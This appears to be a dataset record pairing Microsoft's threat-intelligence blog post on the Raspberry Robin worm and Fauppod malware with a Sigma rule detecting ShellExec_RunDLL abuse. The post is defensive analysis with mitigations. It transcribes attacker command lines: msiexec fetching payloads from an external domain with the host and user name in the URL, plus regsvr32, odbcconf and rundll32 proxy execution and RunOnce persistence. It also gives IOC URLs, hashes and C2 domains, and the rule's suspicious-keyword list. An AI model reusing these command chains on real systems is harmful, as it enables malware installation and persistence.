threats.\nTranscription: |\n  Initial infection vectors\n  -------------------------\n  - Malicious ads\n  - Attacker-controlled intermediary server (DEV-0651)\n  - Command-and-control to compromised QNAP\n  - FAUPPOD-packed malware\n  - Public cloud infrastructure (e.g., Azure, Discord, GitHub, and SpiderOak)\n  \n  Connections to other malware\n  -----------------------------\n  - DEV-0206: FakeUpdates/SocGholish JavaScript\n  - DEV-0856: ROSHTYAK malware\n    - More Raspberry Robin victims via LNK USB infection\n  - DEV-0243: Cobalt Strike and interactive human-operated ransomware intrusion\n  - LockBit ransomware\n  - DEV-0249: IcedID\n  - DEV-0249: Bumblebee\n  - DEV-0950: Cobalt Strike and interactive human-operated ransomware intrusion\n  - Clop ransomware\n  - DEV-0950: Truebot\n```\n\n_Figure 4. Raspberry Robin’s connectivity to a larger cybercriminal ecosystem_\n\n### Introducing Fauppod: Like FakeUpdates but without the fake updates\n\nOn July 26, 2022, Microsoft witnessed the first reported instance of a Raspberry Robin-infected host deploying a FakeUpdates (also known as SocGholish) JavaScript backdoor. Previously, FakeUpdates were delivered primarily through drive-by downloads or malicious ads masquerading as browser updates. Microsoft tracks the activity group behind FakeUpdates as DEV-0206 and the USB-based Raspberry Robin infection operators as DEV-0856.\n\nAfter discovering Raspberry Robin-deployed FakeUpdates, Microsoft security researchers continued monitoring for other previously unidentified methodologies in FakeUpdates deployments. Research into the various malware families dropped by Raspberry Robin’s USB-delivered infections continued, and new signatures were created to track the various outer layers of packed malware under the family name Fauppod.\n\nOn July 27, 2022, Microsoft identified samples detected as Fauppod that have similar process trees with DLLs written by Raspberry Robin LNK infections in similar locations and using similar naming conventions. Their infection chains also dropped the FakeUpdates malware. However, the victim hosts where these samples were detected didn’t have the traditional infection vector of an LNK file launched from an infected USB drive, as detailed in Red Canary’s blog.\n\nIn this instance, Fauppod was delivered via _codeload[.]github[.]com_, a fraudulent and malicious repository created by a cybercriminal actor that Microsoft tracks as DEV-0651. The payload was delivered as a ZIP archive file containing another ZIP file, which then had a massive (700MB) Control Panel (CPL) file inside. Attackers use nested containers such as ZIP, RAR, and ISO files to avoid having their malicious payloads stamped with Mark of the Web (MOTW), which Windows uses to mark files from the internet and thus enable security solutions to block certain actions. Control Panel files are similar to other PEs like EXE and DLL files.\n\nMicrosoft has since seen DEV-0651 deliver Fauppod samples by taking advantage of various public-facing trusted and legitimate cloud services beyond GitHub, including Azure, Discord, and SpiderOak. Refer to the indicators of compromise (IOCs) below for more details. Microsoft has shared information about this threat activity and service abuse with these hosting providers.\n\n### Connecting the dot(net malware)\n\nWith the discovery of the DEV-0651 link, Microsoft had two pieces of evidence suggesting a relationship between Fauppod and Raspberry Robin:\n\n- Both malware families were delivering FakeUpdates\n- Signatures created to detect Raspberry Robin DLL samples on hosts infected by the publicly known LNK file spreading mechanism were detecting malware that wasn’t being delivered through any previously known Raspberry Robin connections\n\nFollowing DEV-0651’s previous leveraging of cloud hosting services, the earliest iteration of a DEV-0651-related campaign that Microsoft was able to identify occurred in September 2021, which was around the same time Red Canary stated Raspberry Robin began to propagate.\n\nBased on these facts, Microsoft reached low-confidence assessment that the Fauppod malware samples were related to the later delivery of what was publicly known as Raspberry Robin and started investigating these links to raise confidence and discover more information.\n\nWhile authoring both file-based and behavior-based detections for Fauppod samples, Microsoft utilized existing detections based on the use of OBDCCONF as a LOLBin to launch _regsvr32_ (which was also detailed in Red Canary’s blog as a Raspberry Robin tactic, technique, and procedure (TTP)):\n\n```image\nAlt: Screenshot of commands using ODBCCONF as a proxy for regsvr execution\nDescription: The image contains a screenshot of command lines executed using the 'rundll32.exe' utility. It demonstrates the execution of a Shell command with parameters for loading a DLL file through 'ShellExec_RunDLL'. The command also incorporates a path to 'odbcconf' for registration, along with additional parameters indicating the installation of a driver. The presence of a specific DLL path and parameters suggests a technique used in malware execution, specifically related to the Raspberry Robin worm and its propagation method.\nTranscription: |\n  \"rundll32.exe\" SHELL32,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\odbccconf\" -s /c -A {regsvr\n  \"C:\\ProgramData\\Mzcvi\\adagmkc.lj.\"} /A {installdriver UBJWEBCPC CNKFAEJCRGH} /A {INSTALLTRANSLATOR}\n```\n\n_Figure 5. ODBCCONF being used as a proxy for regsvr execution, similar to Red Canary’s blog on Raspberry Robin_\n\nMicrosoft noted a unique quality in the command execution that was persistent through all Raspberry Robin infections stemming from an infected USB drive: there was a trailing “.” character at the end of the DLL name within the command above.\n\nWhile reviewing DEV-0651 Fauppod-delivered malware, Microsoft identified a Fauppod CPL sample served via GitHub when the following command is run:\n\n```image\nAlt: Screenshot of commands generated by DEV-0651's Fauppod CPL\nDescription: The image displays a screenshot of command-line instructions related to malware execution. The commands include the use of 'RUNDLL32.EXE' to execute 'shell32.dll' with 'ShellExec_RunDLL', and 'MSIEXEC.EXE' with various parameters. The paths reference system directories and a randomly named directory under 'ProgramData', indicating a method of executing malicious payloads, consistent with behaviors associated with the Raspberry Robin and Fauppod malware.\nTranscription: |\n  C:\\WINDOWS\\system32\\RUNDLL32.EXE shell32.dll,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\MSIEXEC.EXE\" -passive kwxqphxvuxcqb=JVHSVRNQYKIDCWK -promptrestart /z\n  \"C:\\ProgramData\\Jyfedj\\hfttnnm.ea.\" /PROMPTSTART\n```\n\n_Figure 6. DEV-0651 Fauppod CPL generated command line_\n\nNotable in the above Fauppod command are the following:\n\n- The use of _msiexec.exe_ to launch the Windows binary _shell32.dll_ as a LOLBin, instead of launching the malware PE directly via _rundll32.exe_, using _rundll32.exe_ to launch _shell32.dll_, and passing _ShellExec_RunDLL_ to load the commands—a TTP consistent with Raspberry Robin.\n- Fauppod CPL file’s use of a staging directory to copy a payload to disk using randomly generated directories in _ProgramData_ that then contain malicious PE files with randomly generated names and extensions. This naming pattern overlaps with those leveraged by publicly known Raspberry Robin DLLs.\n- The same trailing “.” in the DLL name as seen in the ODBCCONF proxying detailed in Red Canary’s blog. Avast also later noted this trailing in the DLL implant dropped by Raspberry Robin, which they refer to as Roshtyak.\n\nThese findings raised Microsoft’s confidence in assessing whether there is a connection between Fauppod’s CPL files and Raspberry Robin extending beyond a similarity in outer layers and packing of the malware.\n\nMicrosoft security researchers also identified a payload within a Fauppod sample communicating with a compromised QNAP storage server to send information about the infected device, overlapping with Raspberry Robin’s use of compromised QNAP appliances for C2.\n\nWhile continuing to monitor the prevalence and infection sources of Fauppod, Microsoft identified a heavily obfuscated .NET malware (SHA-256: a9d5ec72fad42a197cbadcb1edc6811e3a8dd8c674df473fd8fa952ba0a23c15) arriving on hosts that had previously been infected with either Raspberry Robin LNK infected hosts or Fauppod CPL malware.\n\n```image\nAlt: This screenshot shows the .NET DLL execution where the folder names are generated from combining two words from the dictionary.\nDescription: The image displays a command line execution screenshot showing the use of 'rundll32.EXE' to invoke a dynamically linked library (DLL) located in 'C:\\ProgramData\\GradeExperience\\'. The DLL file is named 'voicednws_St1_4' and suggests a complex directory structure with obfuscated names. This reflects a technique used in the propagation of malware, specifically related to the Raspberry Robin infection chain discussed in the provided context.\nTranscription: |\n  C:\\WINDOWS\\system32\\rundll32.EXE\n  C:\\ProgramData\\GradeExperience\\EergnitionPing\\uinsoht_Wvdenrl.dll,voicednws_St1_4\n```\n\n_Figure 7. .NET spreader DLL execution, via _rundll32_, with an export of _voicednws_St1_4_; the randomly generated directory structure of using two dictionary words is consistent across a significant number of infected hosts_\n\n```image\nAlt: This screenshot of the DNSpy app user interface shows the obfuscation of the .NET DLL file believed to be creating Raspberry Robin LNK files in USB drives.\nDescription: The image displays a screenshot from the DNSpy application, which is used for inspecting .NET assemblies. On the left side, the Assembly Explorer shows the structure of the 'unished_Wdwn.dll' file, including its base type definitions and various methods. On the right side, you can see the C# code of the assembly, highlighting method definitions and potential malware behavior. This screenshot is relevant as it demonstrates the obfuscation of a .NET DLL believed to be related to the Raspberry Robin malware, providing insights into its functionality and structure.\nTranscription: |\n  using System;\n  using System.Collections;\n  using System.Runtime.InteropServices;\n  using System.Text;\n  \n  namespace DOACIL_Help_IMB\n  {\n      public class hostxnt_wep1sig\n      {\n          // Token: 0x000000B8 RID: 184\n          private static void GlobalsInit()\n          {\n              if (hostxnt_wep1sig.aasds1_systemR0 != null && (uint)hostxnt_wep1sig.aasds1_systemR0.Length > 0)\n              {\n                  int num = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[234]);\n                  uint system_outbuilder = hostxnt_wep1sig.System_outbuilder;\n                  if (num != 0)\n                  {\n                      if (num == 1)\n                      {\n                          int num2 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[89]);\n                          int num3 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[120]);\n                          double num4 = num3 + num2;\n                          hostxnt_wep1sig.G0sPa_Resourc1;\n                      }\n                      else\n                      {\n                          uint num5 = num1;\n                      }\n                  }\n              }\n          }\n      }\n  }\n```\n\n_Figure 8. DNSpy screenshot of a highly obfuscated .NET DLL assessed to be responsible for creating Raspberry Robin LNK files on external USB drives_\n\nWhile inspecting these samples, Microsoft noted that many were responsible for creating LNK files on external USB drives.\n\nBased on our investigation, Microsoft currently assesses with medium confidence that the above .NET DLLs delivered both by Raspberry Robin LNK infections and Fauppod CPL samples are responsible for spreading Raspberry Robin LNK files to USB drives. These LNK files, in turn, infect other hosts via the infection chain detailed in Red Canary’s blog.\n\nMicrosoft also assesses with medium confidence that the Fauppod-packed CPL samples are currently the earliest known point in the attack chain for propagating Raspberry Robin infections to targets. Microsoft findings suggest that the Fauppod CPL entities, the obfuscated .NET LNK spreader modules they drop, the Raspberry Robin LNK files Red Canary documented, and the Raspberry Robin DLL files (or, Roshtyak, as per Avast) could all be considered as various components to the “Raspberry Robin” malware infection chain.\n\n### The Fauppod-Dridex connection\n\nIn July 2022, Microsoft found Raspberry Robin infections that led to hands-on-keyboard activity by DEV-0243. One of the earliest malware campaigns to bring notoriety to DEV-0243 was the Dridex banking trojan.\n\nCode similarity between malware families is often used to demonstrate a link between families to a tracked actor. In IBM’s blog post published after we observed the Raspberry Robin and DEV-0243 connection, they highlighted several code similarities between the loader for the Raspberry Robin DLLs and the Dridex malware.\n\nMicrosoft’s analysis of Fauppod samples also identified some Dridex filename testing features, which are used to avoid running in certain environments. Fauppod has similar functionality to avoid execution if it recognizes it’s running as _testapp.exe_ or _self.exe_. This code similarity has historically caused some Fauppod samples to trip Dridex detection alerts.\n\n```image\nAlt: Screenshot of Fauppod code that shows commands related to its anti-investigation techniques.\nDescription: The image is a screenshot of code related to the Fauppod malware, highlighting commands that demonstrate its anti-investigation techniques. It specifically shows two segments of code that look for the presence of filenames \"self.exe\" and \"testapp.exe\" using API calls like `GetModuleHandleA` and `LoadLibraryW`. The highlighted sections illustrate how the malware avoids execution in certain environments, which is a technique linked to previous Dridex samples.\nTranscription: |\n  text:00401010\n  sub_401010 proc near              ; CODE XREF: DllEntryPoint:loc_401001\n  var_D          = byte ptr -0Ch\n  var_C          = dword ptr -8\n  var_8          = dword ptr -4\n  var_4          = dword ptr -0\n  push ebp\n  mov ebp, esp\n  sub esp, 14h\n  xor eax, eax\n  mov eax, ds:CloseHandle\n  cmp byte ptr [ecx], 08h\n  cmp [ebp+var_4], eax\n  jz short loc_401043\n  loc_401043:\n  mov eax, ds:GetCurrentThreadId\n  call eax\n  mov ecx, ds:OutputDebugStringA\n  cmp byte ptr [edx], 6Ah\n  cmp [ebp+var_8], eax\n  mov [ebp+var_4], ecx\n  jnz short loc_401078\n  loc_401048:\n  mov eax, esp\n  mov dword ptr [eax], offset aSelfExe ; \"self.exe\"\n  mov eax, ds:GetModuleHandleA\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  mov [ebp+var_4], ecx\n  call sub_401070\n  loc_401070:\n  mov eax, esp\n  mov dword ptr [eax], offset aTestappExe ; \"testapp.exe\"\n  mov eax, ds:LoadLibraryW\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  setz cl\n  mov eax, ecx\n  mov [ebp+var_4], cl\n  test cl, 1\n  jz short loc_401043\n  endp\n```\n\n_Figure 9. Screenshot highlighting _“self.exe”_ and _“testapp.exe”_ evasions in Fauppod using _GetModuleHandleA_ and _LoadLibraryW_ API calls, similar to previous Dridex samples_\n\nGiven the previously documented relationship between Raspberry Robin and DEV-0206/DEV-0243 (EvilCorp), this behavioral similarity in the initial vector for Raspberry Robin infections adds another piece of evidence to the connection between the development and propagation of Fauppod/Raspberry Robin and DEV-0206/DEV-0243.\n\n## Raspberry Robin’s future as part of the cybercriminal gig economy\n\nCybercriminal malware is an ever-present threat for most organizations today, taking advantage of common weaknesses in security strategies and using social engineering to trick users. Almost every organization risks encountering these threats, including Fauppod/Raspberry Robin and FakeUpdates. Developing a robust protection and detection strategy and investing in credential hygiene, least privileges, and network segmentation are keys to preventing the impact of these complex and highly connected cybercriminal threats.\n\nRaspberry Robin’s infection chain is a confusing and complicated map of multiple infection points that can lead to many different outcomes, even in scenarios where two hosts are infected simultaneously. There are numerous components involved; differentiating them could be challenging as the attackers behind the threat have gone to extreme lengths to protect the malware at each stage with complex loading mechanisms. These attackers also hand off to other actors for some of the more impactful attack stages, such as ransomware deployment.\n\nAs of this writing, Microsoft is aware of at least four confirmed Raspberry Robin entry vectors. These entry points were linked to hands-on-keyboard actions by attackers, and they all led to intrusions where the end goal was likely deployment of ransomware.\n\nInfections from Fauppod CPL files and the Raspberry Robin worm component have facilitated human-operated intrusions indicative of pre-ransomware activity. Based on the multiple infection stages and varied payloads, Microsoft assesses that DEV-0651’s initial access vector, the various spreading techniques of the malicious components, and high infection numbers have provided an attractive distribution option for follow-on payloads.\n\nBeginning on September 19, 2022, Microsoft identified Raspberry Robin worm infections deploying IcedID and—later at other victims—Bumblebee and TrueBot payloads. In October 2022, Microsoft researchers observed Raspberry Robin infections followed by Cobalt Strike activity from DEV-0950. This activity, which in some cases included a Truebot infection, eventually deployed the Clop ransomware.\n\n## Defending against Raspberry Robin infections\n\nWorms can be noisy and could lead to alert fatigue in security operations centers (SOCs). Such fatigue could lead to improper or untimely remediation, providing the worm operator ample opportunity to sell access to the affected network to other cybercriminals.\n\nWhile Raspberry Robin seemed to have no purpose when it was first discovered, it has evolved and is heading towards providing a potentially devastating impact on environments where it’s still installed. Raspberry Robin will likely continue to develop and lead to more malware distribution and cybercriminal activity group relationships as its install footprint grows.\n\nMicrosoft Defender for Endpoint and Microsoft Defender Antivirus detect Raspberry Robin and follow-on activities described in this blog. Defenders can also apply the following mitigations to reduce the impact of this threat:\n\n- Prevent drives from using autorun and execution code on insertion or mount. This can be done via registry settings or Group Policy.\n- Follow the defending against ransomware guidance in Microsoft’s RaaS blog post.\n- Enable tamper protection to prevent attacks from stopping or interfering with Microsoft Defender Antivirus.\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.\n\nMicrosoft customers can turn on attack surface reduction rules to prevent several of the infection vectors of this threat. Attack surface reduction rules, which any security administrator can configure, offer significant hardening against the worm. In observed attacks, Microsoft customers who had the following rules enabled were able to mitigate the attack in the initial stages and prevent hands-on-keyboard activity:\n\n- Block untrusted and unsigned processes that run from USB\n- Block execution of potentially obfuscated scripts\n- Block executable files from running unless they meet a prevalence, age, or trusted list criterion\n- Block credential stealing from the Windows local security authority subsystem (lsass.exe)\n\nDefenders can also refer to detection details and indicators or compromise in the following sections for more information about surfacing this threat.\n\n## Detection details\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n- Trojan:Win32/Fauppod\n\nConfigure Defender Antivirus scans to include removable drives. The following command lets admins scan removable drives, such as flash drives, during a full scan using the Set-MpPreference cmdlet:\n\n```\nSet-MpPreference -DisableRemovableDriveScanning\n```\n\nIf you specify a value of _$False_ or do not specify a value, Defender Antivirus scans removable drives during any type of scan. If you specify a value of _$True_, Defender Antivirus doesn’t scan removable drives during a full scan. Defender Antivirus can still scan removable drives during quick scans or custom scans.\n\nDefender Antivirus also detects identified post-compromise payloads as the following malware:\n\n- Behavior:Win32/Socgolsh.SB\n- Trojan:JS/Socgolsh.A\n- Trojan:JS/FakeUpdate.C\n- Trojan:JS/FakeUpdate.B\n- Trojan:Win32/IcedId\n- Backdoor:Win32/Truebot\n- TrojanDownloader:Win32/Truebot\n- Trojan:Win32/Truebot\n- Trojan:Win32/Bumblebee.E\n\n### Microsoft Defender for Endpoint\n\nAlerts with the following titles in the security center can indicate threat activity on your network:\n\n- Potential Raspberry Robin worm command\n- Possible Raspberry Robin worm activity\n\nMicrosoft also clusters indicators related to the presence of the Raspberry Robin worm under DEV-0856. The following alert can indicate threat activity on your network:\n\n- DEV-0856 activity group\n\nThe following alerts might also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and therefore are not monitored in the status cards provided with this report.\n\n- Suspicious process launched using cmd.exe\n- Suspicious behavior by msiexec.exe\n- Observed BumbleBee malware activity\n- Malware activity resembling Bumblebee loader detected\n- BumbleBeeLoader malware was prevented\n- Ransomware-linked emerging threat activity group detected\n- Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)\n- SocGholish command-and-control\n- Suspicious ‘Socgolsh’ behavior was blocked\n- DEV-0651 threat group activity associated with FakeUpdates JavaScript backdoor\n\n## Indicators of compromise (IOCs)\n\nNOTE: These indicators should not be considered exhaustive for this observed activity.\n\n**Fauppod samples delivered by DEV-0651 via legitimate cloud services**\n\n| Sample (SHA-256)                                                 | Related URL                                                                                                                                 | Related ad server    |\n| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |\n| d1224c08da923517d65c164932ef8d931633e5376f74bf0655b72d559cc32fd2 | hxxps://codeload[.]github[.]com/downloader2607/download64_12/zip/refs/heads/main                                                            | ads[.]softupdt[.]com |\n| 0b214297e87360b3b7f6d687bdd7802992bc0e89b170d53bf403e536e07e396e | hxxps://spideroak[.]com/storage/OVPXG4DJMRSXE33BNNPWC5LUN5PTSMRTGAZTG/shared/5392194-1-1040/Setup_64_1.zip?b6755c86e52ceecf8d806bf814690691 | 146[.]70[.]93[.]10   |\n| f18a54ba72df1a17daf21b519ffeee8463cfc81c194a8759a698709f1c9a3e87 | hxxps://dsfdsfgb[.]azureedge[.]net/332_332/universupdatepluginx84.zip                                                                       | Unknown              |\n| 0c435aadaa3c42a71ad8ff80781def4c8ce085f960d75f15b6fee8df78b2ac38 | hxxps://cdn[.]discordapp[.]com/attachments/1004390520904220838/1008127492449648762/Setup_64_11.zip                                          | Unknown              |\n\n**Timeline of Raspberry Robin deployments of various payloads**\n\n| Date    | Sample (SHA-256)                                                                                                                                                                                                     | Malware   | Notes                                                                                           |\n| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------------------------------------------------------------- |\n| 9/19/22 | 1789ba9965adc0c51752e81016aec5749<br>377ec86ec9a30449b52b1a5857424bf                                                                                                                                                 | IcedID    | Configuration details: { “Campaign ID”: 2094382323, “C2 url”: “aviadronazhed[.]com” }       |\n| 9/28/22 | 5c15151a29fab8a2d58fa55aa6c88a58a45<br>6b0a6bc959b843e9ceb2295c61885<br>09247f88d47b69e8d50f0fe4c10c7f0ecc95<br>c979a38c2f7dfee4aec3679b5807<br>f0115a8c173d30369acc86cb8c68d870c8c<br>f8a2b0b74d72f9dbba30d80f05614 | Bumblebee | Bumblebee called out to a Cobalt Strike Beacon server (guteyutur[.]com) shortly after execution |\n| 9/30/22 | 7e39dcd15307e7de862b9b42bf556f2836b<br>f7916faab0604a052c82c19e306ca                                                                                                                                                 | TrueBot   |                                                                                                 |",
    "sigma_rule": {
      "title": "Suspicious Usage Of ShellExec_RunDLL",
      "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
      "related": [
        {
          "id": "36c5146c-d127-4f85-8e21-01bf62355d5a",
          "type": "obsolete"
        },
        {
          "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2022-12-30",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_openasrundll": {
          "CommandLine|contains": "ShellExec_RunDLL"
        },
        "selection_suspcli": {
          "CommandLine|contains": [
            "\\Desktop\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "comspec",
            "iex",
            "Invoke-",
            "msiexec",
            "odbcconf",
            "regsvr32"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_execution.yml",
    "id": "462"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity\n\n**October 27, 2022**\n\n---\n\n> **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.\n>\n> - **DEV-0206** is now tracked as **Mustard Tempest**\n> - **DEV-0243** is now tracked as **Manatee Tempest**\n> - **DEV-0950** is now tracked as **Lace Tempest**\n> - **DEV-0651** is now tracked as **Storm-0651**\n> - **DEV-0856** is now tracked as **Storm-0856**\n>\n> To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.\n\nMicrosoft has discovered recent activity indicating that the Raspberry Robin worm is part of a complex and interconnected malware ecosystem, with links to other malware families and alternate infection methods beyond its original USB drive spread. These infections lead to follow-on hands-on-keyboard attacks and human-operated ransomware activity. Our continuous tracking of Raspberry Robin-related activity also shows a very active operation: Microsoft Defender for Endpoint data indicates that nearly 3,000 devices in almost 1,000 organizations have seen at least one Raspberry Robin payload-related alert in the last 30 days.\n\nRaspberry Robin has evolved from being a widely distributed worm with no observed post-infection actions when Red Canary first reported it in May 2022, to one of the largest malware distribution platforms currently active. In July 2022, Microsoft security researchers observed devices infected with Raspberry Robin being installed with the FakeUpdates malware, which led to DEV-0243 activity. DEV-0243, a ransomware-associated activity group that overlaps with actions tracked as EvilCorp by other vendors, was first observed deploying the LockBit ransomware as a service (RaaS) payload in November 2021. Since then, Raspberry Robin has also started deploying IcedID, Bumblebee, and Truebot based on our investigations.\n\nIn October 2022, Microsoft observed Raspberry Robin being used in post-compromise activity attributed to another actor, DEV-0950 (which overlaps with groups tracked publicly as FIN11/TA505). From a Raspberry Robin infection, the DEV-0950 activity led to Cobalt Strike hands-on-keyboard compromises, sometimes with a Truebot infection observed in between the Raspberry Robin and Cobalt Strike stage. The activity culminated in deployments of the Clop ransomware. DEV-0950 traditionally uses phishing to acquire the majority of their victims, so this notable shift to using Raspberry Robin enables them to deliver payloads to existing infections and move their campaigns more quickly to ransomware stages.\n\nGiven the interconnected nature of the cybercriminal economy, it’s possible that the actors behind these Raspberry Robin-related malware campaigns—usually distributed through other means like malicious ads or email—are paying the Raspberry Robin operators for malware installs.\n\nRaspberry Robin attacks involve multi-stage intrusions, and its post-compromise activities require access to highly privileged credentials to cause widespread impact. Organizations can defend their networks from this threat by having security solutions like Microsoft Defender for Endpoint and Microsoft Defender Antivirus, which is built into Windows, to help detect Raspberry Robin and its follow-on activities, and by applying best practices related to credential hygiene, network segmentation, and attack surface reduction.\n\nIn this blog, we share our detailed analysis of these attacks and shed light on Raspberry Robin’s origins, since its earliest identified activity in September 2021, and motivations which have been debated since it was first reported in May 2022. We also provide mitigation guidance and other recommendations defenders can use to limit this malware’s spread and impact from follow-on hands-on-keyboard attacks.\n\n## A new worm hatches: Raspberry Robin’s initial propagation via USB drives\n\n> The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response.\n\nIn early May 2022, Red Canary reported that a new worm named Raspberry Robin was spreading to Windows systems through infected USB drives. The USB drive contains a Windows shortcut (LNK) file disguised as a folder. In earlier infections, this file used a generic file name like _recovery.lnk_, but in more recent ones, it uses brands of USB drives. It should be noted that USB-worming malware isn’t new, and many organizations no longer track these as a top threat.\n\nFor an attack relying on a USB drive to run malware upon insertion, the targeted system’s _autorun.inf_ must be edited or configured to specify which code to start when the drive is plugged in. Autorun of removable media is disabled on Windows by default. However, many organizations have widely enabled it through legacy Group Policy changes.\n\nThere has been much public debate about whether the Raspberry Robin drives use autoruns to launch or if it relies purely on social engineering to encourage users to click the LNK file. Microsoft Threat Intelligence Center (MSTIC) and Microsoft Detection and Response Team (DART) research has confirmed that both instances exist in observed attacks. Some Raspberry Robin drives only have the LNK and executable files, while drives from earlier infections have a configured _autorun.inf_. This change could be linked to why the names of the shortcut files changed from more generic names to brand names of USB drives, possibly encouraging a user to execute the LNK file.\n\nUpon insertion of the infected drive or launching of the LNK file, the UserAssist registry key in Windows—where Windows Explorer maintains a list of launched programs—is updated with a new value indicating a program was launched by Windows.\n\n```image\nAlt: This diagram shows the linear progression of earlier Raspberry Robin infections.\nDescription: The image is a flowchart illustrating the attack chain of the Raspberry Robin worm. It visually represents the sequence of actions that occur when the USB attachment is inserted. The steps include: 1. Inserting the USB attachment, 2. The LNK file creating a CMD.exe process, 3. The MSiexec.exe using the device's username and hostname to connect to command-and-control (C2) servers, and 4. Continued call outs to TOR nodes. Each step is depicted with icons and arrows indicating the progression of the attack.\nTranscription: |\n  [Diagram]\n  \n  USB attachment inserted\n      ↓\n  LNK file creates a CMD.exe process\n      ↓\n  MSIexec.exe using the device username and hostname connects to C2\n      ↓\n  Continued call outs to TOR nodes\n```\n\n_Figure 1. Attack chain of the original Raspberry Robin infections_\n\nThe UserAssist key stores the names of launched programs in ROT13-ciphered format, which means that every letter in the name of the program is replaced with the 13th letter in the alphabet after it. This routine makes the entries in this registry key not immediately readable. The UserAssist key is a useful forensic artifact to demonstrate which applications were launched on Windows, as outlined in Red Canary’s blog.\n\nWindows shortcut files are mostly used to create an easy-to-find shortcut to launch a program, such as pinning a link to a user’s browser on the taskbar. However, the format allows the launching of any code, and attackers often use LNK files to launch malicious scripts or run stored code remotely. Raspberry Robin’s LNK file points to _cmd.exe_ to launch the Windows Installer service _msiexec.exe_ and install a malicious payload hosted on compromised QNAP network attached storage (NAS) devices.\n\n```image\nAlt: Screenshot of command lines where Raspberry Robin uses the Windows installer service to connect to an external domain.\nDescription: The image displays a series of command line entries showing how the Raspberry Robin worm utilizes the Windows Installer service (msiexec) to connect to an external domain for downloading or executing malicious payloads. The commands include variations of the msiexec command, formatted with different case sensitivity, and reference an HTTP protocol connection to a domain along with a randomly generated path that likely incorporates the host name and username. This illustrates the mechanism by which the worm executes its payload upon infection.\nTranscription: |\n  MSiexEc /q-i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  MsiEXEC /q /i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  mSiexEc -Q\"Ihttp://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n```\n\n_Figure 2. Examples of URLs connecting to an external domain_\n\nOnce the Raspberry Robin payload is running, it spawns additional processes by using system binaries such as _rundll32.exe_, _odbcconf.exe_, and _control.exe_ to use as living-off-the-land binaries (LOLBins) to run malicious code. Raspberry Robin also launches code via _fodhelper.exe_, a system binary for managing optional features, as a user access control (UAC) bypass.\n\nThe malware injects into system processes including _regsvr32.exe_, _rundll32.exe_, and _dllhost.exe_ and connects to various command-and-control (C2) servers hosted on Tor nodes.\n\nIn most instances, Raspberry Robin persists by adding itself to the RunOnce key of the registry hive associated with the user who executed the initial malware install. The registry key points to the Raspberry Robin binary, which has a random name and a random extension such as _.mh_ or _.vdm_ in the user’s _AppData_ folder or to _ProgramData_. The key uses the intended purpose of _regsvr32.exe_ to launch the portable executable (PE) file, allowing the randomized non-standard file extension to launch the executable content.\n\n```image\nAlt: Screenshot of the contents of the RunOnce registry key where the value points to the randomly-named Raspberry Robin file.\nDescription: The image displays a snippet of command lines used in the Raspberry Robin worm's operation. It shows the execution of 'rundll32.exe' with parameters that involve calling 'SHELL32.DLL' and 'REGSVR32.EXE' to run a malicious payload located in the user's temporary directory. This illustrates the malware's method of executing commands and its reliance on legitimate system binaries to carry out its malicious activities.\nTranscription: \"C:\\Windows\\System32\\rundll32.exe\" SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE /u -S \"C:\\Users[UserName]\\AppData\\Local\\Temp\\cnsbi.mh.\"\n```\n\n_Figure 3. Example of the contents of the RunOnce key_\n\nEntries in the RunOnce key delete the registry entry prior to launching the executable content at sign-in. Raspberry Robin re-adds this key once it is successfully running to ensure persistence. After the initial infection, this leads to _RunOnce.exe_ launching the malware payload in timelines. Raspberry Robin also temporarily renames the RunOnce key when writing to it to evade detections.\n\n## Raspberry Robin’s connection to a larger malware ecosystem\n\nSince our initial analysis, Microsoft security researchers have discovered links between Raspberry Robin and other malware families. The Raspberry Robin implant has also started to distribute other malware families, which is not 